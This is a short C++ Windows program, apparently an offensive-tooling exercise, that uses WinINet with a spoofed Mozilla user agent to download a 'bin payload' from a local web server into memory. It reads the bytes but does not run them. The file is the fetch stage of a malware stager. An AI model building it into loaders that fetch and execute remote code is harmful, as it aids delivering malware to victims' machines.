// download bin payload from web server and read it into memory 
//

#include <iostream>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

BOOL DownloadPayloadFromUrl() {
    HINTERNET hnet = NULL;
    HINTERNET hfile = NULL;
    PBYTE pBytes = NULL;
    DWORD dwSize = 0;

    hnet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hnet == NULL) {
        printf("InternetOpen failed: %d\n", GetLastError());
        return FALSE;
	}

    hfile = InternetOpenUrlW(hnet, L"http://127.0.0.1/test.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hfile == NULL) {
        printf("InternetOpenUrl failed: %d\n", GetLastError());
        return FALSE;
    }

    pBytes = (PBYTE)LocalAlloc(LPTR, 1024 * 1024);
    if (pBytes == NULL) {
		printf("malloc failed: %d\n", GetLastError());
		return FALSE;
	}

    if(!InternetReadFile(hfile, pBytes, 1024 * 1024, &dwSize)) {
		printf("InternetReadFile failed: %d\n", GetLastError());
		return FALSE;
	}
    
    InternetCloseHandle(hnet);
    InternetCloseHandle(hfile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pBytes);



    return TRUE;
}

int main()
{
    if(DownloadPayloadFromUrl()) {
		printf("Downloaded payload successfully\n");
	} else {
		printf("Failed to download payload\n");
	}
}
